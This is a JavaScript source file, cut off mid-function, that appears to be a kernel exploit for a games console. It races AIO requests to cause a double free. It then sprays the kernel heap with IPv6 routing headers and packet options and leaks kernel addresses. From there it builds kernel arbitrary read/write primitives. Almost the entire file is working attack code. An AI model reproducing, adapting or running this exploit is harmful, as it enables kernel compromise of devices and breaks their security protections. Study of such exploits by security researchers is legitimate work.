"use strict";

include("userland.js");
include("threading.js");
include("worker.js");
include("loader.js");
include("kernel.js");

//#region Variables
var NUM_REQS = 3;
var WHICH_REQ = NUM_REQS - 1;
var WORKER_NUM = 2;
var SPRAY_NUM = 0x200;
var IPV6_SOCK_NUM = 0x40;
var FIND_TWINS_NUM = 0x10;
var RACE_NUM = 0x64;
var ATTEMPT_NUM = 0x10;
//#endregion
//#region Contants
var SCE_KERNEL_ERROR_ESRCH = 0x80020003;

var COMMAND_AIO_DELETE = 0;

var AIO_OP_CANCEL = 1;
var AIO_OP_WAIT = 2;
var AIO_OP_POLL = 4;
var AIO_OP_DELETE = 8;

var AIO_WAIT_AND = 1;
var AIO_CMD_READ = 1;
var AIO_CMD_WRITE = 2;
var AIO_CMD_MULTI = 0x1000;
var AIO_PRIORITY_HIGH = 3;
var AIO_STATE_COMPLETE = 3;
var AIO_STATE_ABORTED = 4;
var AIO_MAX_REQ_COUNT = 0x80;

var twins = new Array(2);
var block_ss = new Array(2);
var ipv6_socks = new Array(IPV6_SOCK_NUM);
var spray_ids = new Uint32Array(SPRAY_NUM);
var outs = new Uint32Array(AIO_MAX_REQ_COUNT);

var reqs = undefined;
var race_worker = undefined;
var race_thread = undefined;

var block_id = undefined;
var dirty_fd = undefined;

var evf = undefined;
var evf_cv_addr = undefined;
var kmalloc_buf_addr = undefined;
var reqs1_addr = undefined;
var aio_info_addr = undefined;
var target_id = undefined;

var accept = new NativeFunction(0x1E, "bigint");
var getsockname = new NativeFunction(0x20, "bigint");
var connect = new NativeFunction(0x62, "bigint");
var bind = new NativeFunction(0x68, "bigint");
var listen = new NativeFunction(0x6A, "bigint");
var socketpair = new NativeFunction(0x87, "bigint");
var evf_create = new NativeFunction(0x21A, "bigint");
var evf_delete = new NativeFunction(0x21B, "bigint");
var evf_set = new NativeFunction(0x220, "bigint");
var evf_clear = new NativeFunction(0x221, "bigint");
var aio_multi_delete = new NativeFunction(0x296, "bigint");
var aio_multi_wait = new NativeFunction(0x297, "bigint");
var aio_multi_poll = new NativeFunction(0x298, "bigint");
var aio_multi_cancel = new NativeFunction(0x29A, "bigint");
var aio_submit_cmd = new NativeFunction(0x29D, "bigint");
//#endregion
//#region Extensions
Uint32Array.prototype.get_backing = function () {
  return view(addrof(this)).getBigInt(0x10, true);
};

Uint32Array.prototype.set_backing = function (addr) {
  view(addrof(this)).setBigInt(0x10, addr, true);
};

Uint32Array.prototype.set_length = function (length) {
  if (!Number.isInteger(length) || length < -0x80000000 || length > 0x7FFFFFFF) {
    throw new RangeError(`${length} is not 32-bit signed number`);
  }

  view(addrof(this)).setInt32(0x18, length, true);
};
//#endregion
//#region Functions
function spray_aio(cmd, num_reqs, ids_addr, spray_count) {
    var step = cmd & AIO_CMD_MULTI ? num_reqs : 1;
    var count = spray_count * step;

    for (var i = 0; i < count; i += step) {
        var ids_offset_addr = ids_addr.add(i * Uint32Array.BYTES_PER_ELEMENT);

        aio_submit_cmd.invoke(cmd, reqs.addr, num_reqs, AIO_PRIORITY_HIGH, ids_offset_addr);
    }
}

function process_aio(op, ids_addr, count) {
    var offset = 0;
    while (count > 0) {
        var step = Math.min(count, AIO_MAX_REQ_COUNT);
        var ids_offset_addr = ids_addr.add(offset * Uint32Array.BYTES_PER_ELEMENT);

        if (op & AIO_OP_CANCEL) {
            aio_multi_cancel.invoke(ids_offset_addr, step, outs.get_backing());
        }

        if (op & AIO_OP_WAIT) {
            aio_multi_wait.invoke(ids_offset_addr, step, outs.get_backing(), AIO_WAIT_AND, 0);
        }

        if (op & AIO_OP_POLL) {
            aio_multi_poll.invoke(ids_offset_addr, step, outs.get_backing());
        }

        if (op & AIO_OP_DELETE) {
            aio_multi_delete.invoke(ids_offset_addr, step, outs.get_backing());
        }

        count -= step;
        offset += step;
    }
}

function spawn_race_thread(ids_addr) {
    debug("Spawn race thread..");

    var userland = read_file_str("/download0/userland.js");
    var worker = read_file_str("/download0/worker.js");

    // Prepare worker
    race_worker = new Worker(alloc(worker_ctx.sizeof), 1);

    var race_start = userland + worker + `
        var COMMAND_AIO_DELETE = 0;

        var race_worker_ctx_addr = new BigInt("${race_worker.ctx.addr}");
        var race_worker = new Worker(race_worker_ctx_addr);

        var aio_multi_delete = new NativeFunction(0x296, "bigint");

        var aio_ids_addr = new BigInt("${ids_addr}");
        var outs_addr = new BigInt("${outs.get_backing()}");

        try {
            while (true) {
                var cmd = race_worker.wait_for_work();
                if (cmd === COMMAND_STOP) break;

                if (cmd === COMMAND_AIO_DELETE) {
                    var aio_ids_offset_addr = aio_ids_addr.add(${WHICH_REQ} * Uint32Array.BYTES_PER_ELEMENT);
                    var outs_offset_addr = outs_addr.add(1 * Uint32Array.BYTES_PER_ELEMENT);

                    aio_multi_delete.invoke(aio_ids_offset_addr, 1, outs_offset_addr);
                }

                race_worker.signal_finished();
            }
        } catch(e) {
            notify(\`\${thrd_name} Error: \${e.message}\`); 
        }
    `;

    var name = "race_thread";
    var script =  `var thrd_name = "${name}";` + race_start;

    race_thread = new JSThread(name, script);
    race_thread.execute();

    debug("Race thread spawned !!");
}

function stop_race_thread() {
    if (typeof race_thread !== "undefined" && race_thread.thread.running) {
        debug("Signaling stop to race thread...");

        race_worker.signal_stop();
        race_thread.join();

        debug("race thread stopped !!");

        race_worker.free();
    }
}

function verify_reqs2(addr) {
    var ar2_cmd = view(addr).getInt32(0, true);
    if (ar2_cmd !== AIO_CMD_WRITE) {
        return false;
    }

    var heap_prefixes = [];
    for (var i = 0x10; i <= 0x20; i += 8) {
        var prefix = view(addr).getUint32(i + 4, true);
        if ((prefix >>> 0x10) !== 0xFFFF) {
            return false;
        }
                
        heap_prefixes.push(prefix & 0xFFFF);
    }

    var ar2_result_state = view(addr).getInt32(0x38, true);
    if (ar2_result_state <= 0 || ar2_result_state > 4) {
        return false;
    }

    var ar2_result_padding = view(addr).getInt32(0x3C, true);
    if (ar2_result_padding !== 0) {
        return false;
    }

    var ar2_file = view(addr).getBigInt(0x40, true);
    if (ar2_file.neq(0)) {
        return false;
    }

    for (var i = 0x48; i <= 0x50; i += 8) {
        var prefix = view(addr).getUint32(i + 4, true);
        if ((prefix >>> 0x10) === 0xFFFF) {
            if ((prefix & 0xFFFF) !== 0xFFFF) {
                heap_prefixes.push(prefix & 0xFFFF);
            }
        } else if (i === 0x50 || view(addr).getBigInt(i, true).neq(0)) {
            return false;
        }
    }

    return heap_prefixes.every(v => v === heap_prefixes[0]);
}

function find_twins() {
    for (var i = 0; i < FIND_TWINS_NUM; i++) {
        for (var j = 0; j < ipv6_socks.length; j++) {
            view(spray_rthdr0_addr).setInt32(4, j, true); // ip6_rthdr0.ip6r0_reserved

            set_rthdr(ipv6_socks[j]);
        }

        for (var j = 0; j < ipv6_socks.length; j++) {
            get_rthdr(ipv6_socks[j], ip6_rthdr0.sizeof); 

            var idx = view(leak_rthdr0_addr).getInt32(4, true); // ip6_rthdr0.ip6r0_reserved
            if (idx !== j) {
                debug(`Found twins after ${i} iterations !!`);

                twins[0] = ipv6_socks[j];
                twins[1] = ipv6_socks[idx];

                var max = Math.max(j, idx);
                var min = Math.min(j, idx);

                // remove twins from list
                ipv6_socks.splice(max, 1);
                ipv6_socks.splice(min, 1);

                // free rthdr from rest of sockets
                for (var k = 0; k < ipv6_socks.length; k++) {
                    free_rthdr(ipv6_socks[k]);
                }

                // replace twins with new sockets
                ipv6_socks.push(make_udp6_sock(), make_udp6_sock());

                return;
            }
        }
    }

    throw new Error("Unable to find twins !!");
}

function make_pktopts_twins() {
    var tclass_addr = alloc(4);
    var tclass_len_addr = alloc(4);

    for (var i = 0; i < FIND_TWINS_NUM; i++) {
        for (var j = 0; j < ipv6_socks.length; j++) {
            if (setsockopt.invoke(ipv6_socks[j], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0).eq(-1)) {
                throw new SyscallError(`Unable to set socket option for fd ${ipv6_socks[j]} !!`);
            }
        }

        for (var j = 0; j < ipv6_socks.length; j++) {
            view(tclass_addr).setInt32(0, j, true);

            if (setsockopt.invoke(ipv6_socks[j], IPPROTO_IPV6, IPV6_TCLASS, tclass_addr, 4).eq(-1)) {
                throw new SyscallError(`Unable to set socket option for fd ${ipv6_socks[j]} !!`);
            }
        }

        for (var j = 0; j < ipv6_socks.length; j++) {
            view(tclass_len_addr).setInt32(0, 4, true);

            if (getsockopt.invoke(ipv6_socks[j], IPPROTO_IPV6, IPV6_TCLASS, tclass_addr, tclass_len_addr).eq(-1)) {
                throw new SyscallError(`Unable to get socket option for fd ${ipv6_socks[j]} !!`);
            }

            var idx = view(tclass_addr).getInt32(0, true);
            if (idx !== j) {
                debug(`Made pktopts twins after ${i} iterations !!`);

                twins[0] = ipv6_socks[j];
                twins[1] = ipv6_socks[idx];

                var max = Math.max(j, idx);
                var min = Math.min(j, idx);

                // remove twins from list
                ipv6_socks.splice(max, 1);
                ipv6_socks.splice(min, 1);

                // replace twins with new sockets, and add pktopts now while new allocs can't
                // use the double freed memory
                for (var k = 0; k < twins.length; k++) {
                    var sock = make_udp6_sock();
                    
                    if (setsockopt.invoke(sock, IPPROTO_IPV6, IPV6_TCLASS, tclass_addr, 4).eq(-1)) {
                        throw new SyscallError(`Unable to set socket option for fd ${sock} !!`);
                    }

                    ipv6_socks.push(sock);
                }

                return;
            }
        }
    }

    throw new Error("Unable to make pktopts twins !!");
}

function init() {
    log("Environment init started...");

    // Prepare spray/leak rthdr0
    spray_rthdr0_addr = alloc(0x100);
    spray_rthdr0_len = build_rthdr(spray_rthdr0_addr, 0x80);

    leak_rthdr0_addr = alloc(0x800);

    // Prepare reqs
    reqs = SceKernelAioRWRequest.from(alloc(SceKernelAioRWRequest.sizeof * AIO_MAX_REQ_COUNT));
    for (var i = 0; i < AIO_MAX_REQ_COUNT; i++) {
        reqs.from_at(i).fd = -1;
    }

    make_karw_pipe();

    var pair_addr = alloc(8);

    // Create socket pair
    if (socketpair.invoke(AF_UNIX, SOCK_STREAM, 0, pair_addr).eq(-1)) {
        throw new SyscallError("Unable to create uio socket pair !!");
    }

    block_ss[0] = view(pair_addr).getInt32(0, true);
    block_ss[1] = view(pair_addr).getInt32(4, true);

    debug(`block_ss: ${block_ss.map(v => v.hex())}`);

    dispose(pair_addr);

    // Setup sockets for spraying and initialize pktopts
    for (var i = 0; i < ipv6_socks.length; i++) {
        ipv6_socks[i] = make_udp6_sock();
    }

    log("Environment init completed !!");
}

function setup() {
    log(`Block AIO...`);

    for (var i = 0; i < WORKER_NUM; i++) {
        reqs.from_at(i).nbyte = 1;
        reqs.from_at(i).fd = block_ss[0];
    }

    spray_aio(AIO_CMD_READ, WORKER_NUM, spray_ids.get_backing(), 1);

    block_id = spray_ids[0];
    debug(`block_id: ${block_id.hex()}`);

    log(`Spray AIO...`);

    for (var i = 0; i < NUM_REQS; i++) {
        reqs.from_at(i).nbyte = 0;
        reqs.from_at(i).fd = -1;
    }

    spray_aio(AIO_CMD_READ, NUM_REQS, spray_ids.get_backing(), spray_ids.length);
    process_aio(AIO_OP_CANCEL, spray_ids.get_backing(), spray_ids.length);
}

function cleanup() {
    log("Environment cleanup started...");

    for (var i = 0; i < block_ss.length; i++) {
        if (block_ss[i] === 0) {
            continue;
        }

        if (close.invoke(block_ss[i]).eq(-1)) {
            throw new SyscallError(`Unable to close fd ${block_ss[i]} !!`);
        }
    }

    if (!Array.from(spray_ids).every(v => v === 0)) {
        process_aio(AIO_OP_POLL | AIO_OP_DELETE, spray_ids.get_backing(), spray_ids.length);
        bzero(spray_ids.get_backing(), spray_ids.length * Uint32Array.BYTES_PER_ELEMENT);
    }

    if (block_id !== 0) {
        spray_ids[0] = block_id;

        process_aio(AIO_OP_WAIT | AIO_OP_DELETE, spray_ids.get_backing(), spray_ids.length);

        spray_ids[0] = 0;
    }

    for (var i = 0; i < ipv6_socks.length; i++) {
        if (ipv6_socks[i] === 0) {
            continue;
        }

        if (close.invoke(ipv6_socks[i]).eq(-1)) {
            throw new SyscallError(`Unable to close fd ${ipv6_socks[i]} !!`);
        }
    }

    free_karw_pipe();

    stop_race_thread();
    
    log("Environment cleanup completed !!");
};

function double_free_reqs2() {
    var server_addr = sockaddr_in.from(alloc(sockaddr_in.sizeof));

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = 0; // any
    server_addr.sin_addr = 0x7F000001.swap32(); // 127.0.0.1

    var server_sock = make_tcp_sock();
    debug(`server_sock: ${server_sock}`);

    var optval_addr = alloc(4);
    view(optval_addr).setInt32(0, 1, true);

    if (setsockopt.invoke(server_sock, SOL_SOCKET, SO_REUSEADDR, optval_addr, 4).eq(-1)) {
        throw new SyscallError(`Unable to set socket option for fd ${sock} !!`);
    }

    if (bind.invoke(server_sock, server_addr.addr, sockaddr_in.sizeof).eq(-1)) {
        throw new SyscallError(`Unable to bind socket ${server_sock} !!`);
    }

    var addrlen_addr = alloc(4);
    view(addrlen_addr).setInt32(0, sockaddr_in.sizeof, true);

    if (getsockname.invoke(server_sock, server_addr.addr, addrlen_addr).eq(-1)) {
        throw new SyscallError(`Unable to bind socket ${server_sock} !!`);
    }

    debug(`server_sock bound to port ${server_addr.sin_port} !!`);

    if (listen.invoke(server_sock, 1).eq(-1)) {
        throw new SyscallError(`Unable to listen socket ${server_sock} !!`);
    }

    var client_linger = linger.from(alloc(linger.sizeof));

    client_linger.l_onoff = 1;
    client_linger.l_linger = 1;
    
    var aio_ids = new Uint32Array(NUM_REQS);
    for (var i = 0; i < NUM_REQS; i++) {
        reqs.from_at(i).fd = -1;
    }

    spawn_race_thread(aio_ids.get_backing());

    var won_race = false;
    for (var i = 0; i < RACE_NUM; i++) {
        debug(`Attempt AIO double free race...`);

        var client_sock = make_tcp_sock();
        debug(`client_sock: ${client_sock}`);

        if (connect.invoke(client_sock, server_addr.addr, sockaddr_in.sizeof).eq(-1)) {
            throw new SyscallError(`Unable to connect socket ${client_sock} !!`);
        }

        var connected_sock = accept.invoke(server_sock, 0, 0);
        debug(`connected_sock: ${connected_sock}`);
        if (connected_sock.eq(-1)) {
            throw new SyscallError(`Unable to accept socket ${server_sock} !!`);
        }

        if (setsockopt.invoke(client_sock, SOL_SOCKET, SO_LINGER, client_linger.addr, linger.sizeof).eq(-1)) {
            throw new SyscallError(`Unable to set socket option for fd ${sock} !!`);
        }

        reqs.from_at(WHICH_REQ).fd = client_sock;

        spray_aio(AIO_CMD_READ | AIO_CMD_MULTI, aio_ids.length, aio_ids.get_backing(), 1);
        process_aio(AIO_OP_POLL | AIO_OP_CANCEL, aio_ids.get_backing(), aio_ids.length);

        debug(`aio_ids: ${Array.from(aio_ids).map(v => v.hex())}`);

        if (close.invoke(client_sock).eq(-1)) {
            throw new SyscallError(`Unable to close fd ${client_sock} !!`);
        }

        var aio_ids_offset_addr = aio_ids.get_backing().add(WHICH_REQ * Uint32Array.BYTES_PER_ELEMENT);

        race_worker.signal_work(COMMAND_AIO_DELETE);

        process_aio(AIO_OP_POLL, aio_ids_offset_addr, 1);

        var poll_err = outs[0];

        debug(`poll_err: ${poll_err.hex()}`);

        var info_addr = alloc(TCP_INFO_SIZE);

        var info_size_addr = alloc(4);
        view(info_size_addr).setInt32(0, TCP_INFO_SIZE, true);

        if (getsockopt.invoke(connected_sock, IPPROTO_TCP, TCP_INFO, info_addr, info_size_addr).eq(-1)) {
            throw new SyscallError(`Unable to get socket option for fd ${connected_sock} !!`);
        }

        var tcp_state = view(info_addr).getInt8(0);

        debug(`tcp_state: ${tcp_state}`);

        if (poll_err !== SCE_KERNEL_ERROR_ESRCH && tcp_state !== TCPS_ESTABLISHED) {
            process_aio(AIO_OP_DELETE, aio_ids_offset_addr, 1);
            won_race = true;
        }

        race_worker.wait_for_finished();

        var race_errs = Array.from(outs).slice(0, 2);
        debug(`race_errs: ${race_errs.map(v => v.hex())}`);

        process_aio(AIO_OP_DELETE, aio_ids.get_backing(), aio_ids.length);

        if (close.invoke(connected_sock).eq(-1)) {
            throw new SyscallError(`Unable to close fd ${connected_sock} !!`);
        }

        if (won_race) {
            if (race_errs[0] === race_errs[1] && race_errs[0] == 0) {
                log("Looking for twins...");

                find_twins();

                log(`Found twins: ${twins} !!`);

                log(`AIO double free achieved after ${i} iterations !!`);

                if (close.invoke(server_sock).eq(-1)) {
                    throw new SyscallError(`Unable to close fd ${server_sock} !!`);
                }

                stop_race_thread();

                return;
            }

            won_race = false;
        }
    }

    throw new Error("AIO double free failed !!");
}

function leak_kaddrs() {
    log("Leak evf started...");

    var num_reqs = 6;
    var leak_ids_count = 0x100;
    var leak_ids = new Uint32Array(leak_ids_count * num_reqs);
    for (var i = 0; i < num_reqs; i++) {
        reqs.from_at(i).fd = -1;
    }

    if (close.invoke(twins[1]).eq(-1)) {
        throw new SyscallError(`Unable to close fd ${twins[1]} !!`);
    }

    var leaked = false;
    for (var i = 0; i < ATTEMPT_NUM; i++) {
        var evfs = new Array(leak_ids_count);

        for (var j = 0; j < evfs.length; j++) {
            evfs[j] = evf_create.invoke("", 0, (j << 0x10) | 0xF00);
        }
    
        get_rthdr(twins[0], 0x80);

        var flag = view(leak_rthdr0_addr).getInt32(0, true);

        var idx = flag >>> 0x10;
        evf = evfs[idx];

        evf_clear.invoke(evf);
        evf_set.invoke(evf, flag | 1);

        get_rthdr(twins[0], 0x80);
        var new_flag = view(leak_rthdr0_addr).getInt32(0, true);

        if (new_flag === (flag | 1)) {
            debug(`evf: ${evf}`);

            debug(`Leaked evf after ${i} iterations !!`);
            leaked = true;

            evfs.splice(idx, 1);
        }

        for (var i of evfs) {
            evf_delete.invoke(i);
        }

        if (leaked) break;
    }

    if (!leaked) {
        throw new Error("Unable to leak evf !!");
    }

    log("Leaked evf !!");

    evf_clear.invoke(evf);
    evf_set.invoke(evf, 0xFF << 8); // corrupt ip6r0_len to leak (0xFF + 1) * 8 bytes [0x800]

    get_rthdr(twins[0], 0x80);

    evf_cv_addr = view(leak_rthdr0_addr).getBigInt(0x28, true);
    kmalloc_buf_addr = view(leak_rthdr0_addr).getBigInt(0x40, true).sub(0x38);

    debug(`evf_cv_addr: ${evf_cv_addr}`);
    debug(`kmalloc_buf_addr: ${kmalloc_buf_addr}`);

    // use reqs1 to fake a aio_info. set .ai_cred (offset 0x10) to offset 4 of
    // the reqs2 so crfree(ai_cred) will harmlessly decrement the .ar2_ticket
    // field
    reqs.buf = kmalloc_buf_addr.add(4); 

    log("leak reqs2 started...");

    leaked = false;
    for (var i = 0; i < ATTEMPT_NUM; i++) {
        spray_aio(AIO_CMD_WRITE | AIO_CMD_MULTI, num_reqs, leak_ids.get_backing(), leak_ids_count);

        get_rthdr(twins[0], 0x800);

        for (var offset = 0x80; offset < 0x800; offset += 0x80) {
            if (verify_reqs2(leak_rthdr0_addr.add(offset))) {  
                var reqs2_offset = offset;

                debug(`reqs2_offset: ${reqs2_offset.hex()}`);

                debug(`Leaked reqs2 after ${i} iterations !!`);
                leaked = true;

                break;
            }
        }

        if (leaked) break;

        process_aio(AIO_OP_POLL | AIO_OP_CANCEL | AIO_OP_DELETE, leak_ids.get_backing(), leak_ids.length);
    }

    if (!leaked) {
        throw new Error("Unable to leak reqs2 !!");
    }

    log("Leaked reqs2 !!");

    var reqs2_addr = leak_rthdr0_addr.add(reqs2_offset);

    for (var i = 0; i < 0x10; i++) {
        debug(`reqs2[${i}]: ${view(reqs2_addr).getBigInt(i * 8, true)}`);
    }

    reqs1_addr = view(reqs2_addr).getBigInt(0x10, true);
    debug(`reqs1_addr: ${reqs1_addr}`);

    reqs1_addr.lo &= ~0xFF;

    debug(`reqs1_addr: ${reqs1_addr}`);

    aio_info_addr = view(reqs2_addr).getBigInt(0x18, true);

    debug(`aio_info_addr: ${aio_info_addr}`);

    log("leak target_id started...");

    leaked = false;
    for (var i = 0; i < leak_ids.length; i += num_reqs) {
        var leak_ids_offset_addr = leak_ids.get_backing().add(i * Uint32Array.BYTES_PER_ELEMENT);

        process_aio(AIO_OP_CANCEL, leak_ids_offset_addr, num_reqs);

        get_rthdr(twins[0], 0x800);

        var state = view(reqs2_addr).getInt32(0x38, true);
        if (state === AIO_STATE_ABORTED) {
            target_id = leak_ids[i];
            debug(`target_id: ${target_id.hex()}`);

            leak_ids[i] = 0;

            debug(`leaked target_id at batch ${i / num_reqs} !!`);
            leaked = true;

            var start = i + num_reqs;
            break;
        }
    }

    if (!leaked) {
        throw new Error("Unable to leak target_id !!");
    }

    log("Leaked target_id !!");

    var leak_ids_offset_addr = leak_ids.get_backing().add(start * Uint32Array.BYTES_PER_ELEMENT);

    process_aio(AIO_OP_CANCEL, leak_ids_offset_addr, leak_ids.length - start);
    process_aio(AIO_OP_POLL | AIO_OP_DELETE, leak_ids.get_backing(), leak_ids.length);
}

function double_free_reqs1() {
    for (var i = 0; i < AIO_MAX_REQ_COUNT; i++) {
        reqs.from_at(i).fd = -1;
    }

    var num_reqs = 2;
    var aio_ids_count = AIO_MAX_REQ_COUNT;
    var aio_ids = new Uint32Array(aio_ids_count * num_reqs);
    for (var i = 0; i < AIO_MAX_REQ_COUNT; i++) {
        reqs.from_at(i).fd = -1;
    }

    log("Leak AIO queue entry started...");

    evf_delete.invoke(evf);

    var leaked = false;
    for (var i = 0; i < ATTEMPT_NUM; i++) {
        spray_aio(AIO_CMD_READ | AIO_CMD_MULTI, aio_ids_count, aio_ids.get_backing(), num_reqs);

        var len = get_rthdr(twins[0], 0x800);
        debug(`len: ${len}`);

        var ar2_cmd = view(leak_rthdr0_addr).getInt32(0, true);
        debug(`ar2_cmd: ${ar2_cmd}`);

        if (len === 8 && ar2_cmd === AIO_CMD_READ) {
            debug(`Leaked AIO queue entry after ${i} iterations !!`);
            leaked = true;

            process_aio(AIO_OP_CANCEL, aio_ids.get_backing(), aio_ids.length);

            break;
        }

        process_aio(AIO_OP_POLL | AIO_OP_CANCEL | AIO_OP_DELETE, aio_ids.get_backing(), aio_ids.length);
    }

    if (!leaked) {
        throw new Error("Unable to leak AIO queue entry !!");
    }

    log("Leaked AIO queue entry !!");

    log("Craft AIO queue entry started...");

    // .ar2_ticket
    view(spray_rthdr0_addr).setUint32(4, 5, true);

    // .ar2_info
    view(spray_rthdr0_addr).setBigInt(0x18, reqs1_addr, true);

    // craft a aio_batch using the end portion of the buffer
    var reqs3_offset = 0x28;

    // .ar2_batch
    view(spray_rthdr0_addr).setBigInt(0x20, kmalloc_buf_addr.add(reqs3_offset), true);

    var spray_reqs3_addr = spray_rthdr0_addr.add(reqs3_offset);
    var leak_reqs3_addr = leak_rthdr0_addr.add(reqs3_offset);

    // [.ar3_num_reqs, .ar3_reqs_left] aliases .ar2_spinfo
    // safe since free_queue_entry() doesn't deref the pointer
    view(spray_reqs3_addr).setUint32(0, 1, true);
    view(spray_reqs3_addr).setUint32(4, 0, true);

    // [.ar3_state, .ar3_done] aliases .ar2_result.returnValue
    view(spray_reqs3_addr).setUint32(8, AIO_STATE_COMPLETE, true);
    view(spray_reqs3_addr).setUint8(0xC, 0);

    // .ar3_lock aliases .ar2_qentry (rest of the buffer is padding)
    // safe since the entry already got dequeued
    //
    // .ar3_lock.lock_object.lo_flags = (
    //     LO_SLEEPABLE | LO_UPGRADABLE
    //     | LO_RECURSABLE | LO_DUPOK | LO_WITNESS
    //     | 6 << LO_CLASSSHIFT
    //     | LO_INITIALIZED
    // )
    view(spray_reqs3_addr).setUint32(0x28, 0x67B0000, true);
    
    // .ar3_lock.lk_lock = LK_UNLOCKED
    view(spray_reqs3_addr).setBigInt(0x38, 1, true);

    log("Crafted AIO queue entry !!");

    log("Spray crafted AIO queue entry started...");

    if (close.invoke(twins[0]).eq(-1)) {
        throw new SyscallError(`Unable to close fd ${twins[0]} !!`);
    }

    twins.fill(0);

    var overwritten = false;
    for (var i = 0; i < ATTEMPT_NUM; i++) {
        for (var j = 0; j < ipv6_socks.length; j++) {
            set_rthdr(ipv6_socks[j]);
        }

        for (var j = 0; j < num_reqs; j++) {
            for (var k = 0; k < outs.length; k++) {
                outs[k] = -1;
            }

            var aio_ids_offset_addr = aio_ids.get_backing().add(j * aio_ids_count * Uint32Array.BYTES_PER_ELEMENT);

            process_aio(AIO_OP_CANCEL, aio_ids_offset_addr, aio_ids_count);

            var states = Array.from(outs);
            var req_idx = states.indexOf(AIO_STATE_COMPLETE);
            debug(`req_idx: ${req_idx}`);
            if (req_idx !== -1) {
                log(`Found req_idx at batch ${j} after ${i} iterations !!`);

                debug(`states[${req_idx}]: ${states[req_idx].hex()}`);

                var aio_idx = j * aio_ids_count + req_idx;
                var req_id = aio_ids[aio_idx];
                debug(`req_id: ${req_id.hex()}`);
                
                var req_id_addr = aio_ids.get_backing().add(aio_idx * Uint32Array.BYTES_PER_ELEMENT);

                // set .ar3_done to 1
                process_aio(AIO_OP_POLL, req_id_addr, 1);

                debug(`states[${req_idx}]: ${outs[0].hex()}`);

                aio_ids[aio_idx] = 0;

                for (var k = 0; k < ipv6_socks.length; k++) {
                    get_rthdr(ipv6_socks[k], 0x80);

                    var done = view(leak_reqs3_addr).getUint8(0xC);
                    if (done) {
                        debug(`Overwritten crafted AIO queue entry after ${i} iterations !!`);
                        overwritten = true;

                        dirty_fd = ipv6_socks[k];
                        debug(`dirty_fd: ${dirty_fd}`);

                        // remove dirty from list
                        ipv6_socks.splice(k, 1);
                            
                        // free rthdr from rest of sockets
                        for (var n = 0; n < ipv6_socks.length; n++) {
                            free_rthdr(ipv6_socks[n]);
                        }
                    
                        // replace dirty with new sockets
                        ipv6_socks.push(make_udp6_sock());

                        break;
                    }
                }
            }

            if (overwritten) break;
        }

        if (overwritten) break;
    }

    if (!overwritten) {
        throw new Error("Unable to overwite crafted AIO queue entry !!");
    }

    log("Overwritten crafted AIO queue entry !!");

    process_aio(AIO_OP_POLL | AIO_OP_DELETE, aio_ids.get_backing(), aio_ids.length);

    var target_ids = new Uint32Array([req_id, target_id]);

    // enable deletion of target_id
    var target_ids_offset_addr = target_ids.get_backing().add(1 * Uint32Array.BYTES_PER_ELEMENT);

    process_aio(AIO_OP_POLL, target_ids_offset_addr, 1);
    debug(`target status: ${outs[0].hex()}`);

    // PANIC: double free on the 0x100 malloc zone. important kernel data may alias
    process_aio(AIO_OP_DELETE, target_ids.get_backing(), target_ids.length);
    
    var errs = Array.from(outs).slice(0, 2);
    debug(`delete errors: ${errs.map(v => v.hex())}`);

    // we reclaim first since the sanity checking here is longer which makes it
    // more likely that we have another process claim the memory
    try {
        log("Making pktopts twins...");

        // RESTORE: double freed memory has been reclaimed with harmless data
        // PANIC: 0x100 malloc zone pointers aliased
        make_pktopts_twins();

        log(`Made pktopts twins: ${twins} !!`);
    } finally {
        process_aio(AIO_OP_POLL, target_ids.get_backing(), target_ids.length);

        var status = Array.from(outs).slice(0, 2);
        debug(`target status: ${status.map(v => v.hex())}`);

        if (status[0] !== SCE_KERNEL_ERROR_ESRCH) {
            throw new Error("Bad delete of corrupt AIO request");
        }

        if (errs[0] !== errs[1] || errs[0] !== 0) {
            throw new Error("Bad delete of ID pair");
        }
    }
}

function make_karw() {
    log("Initiate kernel ARW...");

    bzero(spray_rthdr0_addr, 0x100);
    spray_rthdr0_len = build_rthdr(spray_rthdr0_addr, 0x100); 

    var ip6po_pktinfo_addr = reqs1_addr.add(0x10);
    view(spray_rthdr0_addr).setBigInt(0x10, ip6po_pktinfo_addr, true); // pktopts.ip6po_pktinfo = &pktopts.ip6po_pktinfo

    log(`Overwrite ${twins[0]} pktopts to ${ip6po_pktinfo_addr} started...`);

    if (close.invoke(twins[1]).eq(-1)) {
        throw new SyscallError(`Unable to close fd ${twins[1]} !!`);
    }

    var overwritten = false;
    for (var i = 0; i < ATTEMPT_NUM; i++) {
        for (var j = 0; j < ipv6_socks.length; j++) {
            // if a socket doesn't have a pktopts, setting the rthdr will make
            // one. the new pktopts might reuse the memory instead of the
            // rthdr. make sure the sockets already have a pktopts before
            view(spray_rthdr0_addr).setUint32(0xB0, (j << 0x10) | 0x1337, true);
            set_rthdr(ipv6_socks[j]);
        }

        var tclass_addr = alloc(4);
        var tclass_len_addr = alloc(4);

        view(tclass_len_addr).setInt32(0, 4, true);
        if (getsockopt.invoke(twins[0], IPPROTO_IPV6, IPV6_TCLASS, tclass_addr, tclass_len_addr).eq(-1)) {
            throw new SyscallError(`Unable to get socket option for fd ${twins[0]} !!`);
        }

        var marker = view(tclass_addr).getUint32(0, true);
        if ((marker & 0xFFFF) === 0x1337) {
            debug(`Overwritten ${twins[0]} pktopts to ${ip6po_pktinfo_addr} after ${i} iterations !!`);
            overwritten = true;

            var idx = marker >>> 0x10;
            twins[1] = ipv6_socks[idx];
            debug(`reclaim_sock: ${twins[1]}`);

            ipv6_socks.splice(idx, 1);

            break;
        }
    }

    if (!overwritten) {
        throw new Error(`Unable to overwite ${twins[0]} pktopts to ${ip6po_pktinfo_addr} !!`);
    }

    log(`Overwritten ${twins[0]} pktopts to ${ip6po_pktinfo_addr} !!`);

    var pktinfo_addr = alloc(0x14);
    var nhop_addr = alloc(4);
    var buf_addr = alloc(8);

    function kread8(addr) {
        view(pktinfo_addr).setBigInt(0, ip6po_pktinfo_addr, true); // pktopts.ip6po_pktinfo = &pktopts.ip6po_pktinfo

        var offset = 0;
        while (offset < 8) {
            view(pktinfo_addr).setBigInt(8, addr.add(offset), true); // pktopts.ip6po_nexthop = addr + offset

            if (setsockopt.invoke(twins[0], IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_addr, 0x14).eq(-1)) {
                throw new SyscallError(`Unable to set socket option for fd ${twins[0]} !!`);
            }

            view(nhop_addr).setInt32(0, 8 - offset, true);

            if (getsockopt.invoke(twins[0], IPPROTO_IPV6, IPV6_NEXTHOP, buf_addr.add(offset), nhop_addr).eq(-1)) {
